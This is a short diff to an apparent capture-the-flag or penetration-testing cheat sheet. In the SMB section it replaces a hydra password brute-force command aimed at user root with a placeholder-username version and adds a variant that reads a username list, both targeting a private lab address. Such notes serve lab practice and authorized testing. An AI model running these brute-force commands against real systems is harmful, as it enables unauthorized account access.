@@ -976,7 +976,11 @@ get flag.txt .
 ```
 ### SMB
 ```console
-hydra -l root -P passwords.txt -f smb://10.0.2.5 -V
+hydra -l username -P passwords.txt -f smb://10.0.2.5 -V
+```
+or
+```console
+hydra -L username.txt -P passwords.txt -f smb://10.0.2.5 -V
 ```
 
 ### HTTP Basic Auth
